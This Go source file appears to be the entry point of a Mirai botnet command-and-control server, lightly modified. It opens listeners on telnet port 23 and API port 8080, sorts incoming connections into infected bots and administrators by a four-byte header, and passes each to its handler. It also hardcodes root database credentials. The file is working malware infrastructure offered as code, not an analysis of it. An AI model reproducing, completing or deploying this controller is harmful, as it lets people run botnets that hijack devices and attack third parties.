package main

import (
    "fmt"
    "net"
    "errors"
    "time"
)

const DatabaseAddr string   = "127.0.0.1"
const DatabaseUser string   = "root"
const DatabasePass string   = "SenhaForte123"
const DatabaseTable string  = "mirai"

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
    tel, err := net.Listen("tcp", "0.0.0.0:23")
    if err != nil {
        fmt.Println(err)
        return
    }

    api, err := net.Listen("tcp", "0.0.0.0:8080")
    if err != nil {
        fmt.Println(err)
        return
    }

    go func() {
        for {
            conn, err := api.Accept()
            if err != nil {
                break
            }
            go apiHandler(conn)
        }
    }()

    for {
        conn, err := tel.Accept()
        if err != nil {
            break
        }
        go initialHandler(conn)
    }

    fmt.Println("Stopped accepting clients")
}

func initialHandler(conn net.Conn) {
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	hdr := make([]byte, 4)
	if err := readXBytes(conn, hdr); err != nil {
		return
	}

	fmt.Printf("[CNC] new conn, first4=%x\n", hdr)

	if hdr[0] == 0x00 && hdr[1] == 0x00 && hdr[2] == 0x00 && hdr[3] == 0x01 {
		idLenBuf := make([]byte, 1)
		if err := readXBytes(conn, idLenBuf); err != nil {
			return
		}

		var source string
		if idLenBuf[0] > 0 {
			sourceBuf := make([]byte, idLenBuf[0])
			if err := readXBytes(conn, sourceBuf); err != nil {
				return
			}
			source = string(sourceBuf)
		}

		fmt.Printf("[CNC] BOT connected. ver=%d source=%q\n", hdr[3], source)
		NewBot(conn, hdr[3], source).Handle()
		return
	}

	fmt.Printf("[CNC] treating as ADMIN\n")
	NewAdmin(conn).Handle()
}

func apiHandler(conn net.Conn) {
    defer conn.Close()

    NewApi(conn).Handle()
}

func readXBytes(conn net.Conn, buf []byte) (error) {
    tl := 0

    for tl < len(buf) {
        n, err := conn.Read(buf[tl:])
        if err != nil {
            return err
        }
        if n <= 0 {
            return errors.New("Connection closed unexpectedly")
        }
        tl += n
    }

    return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}
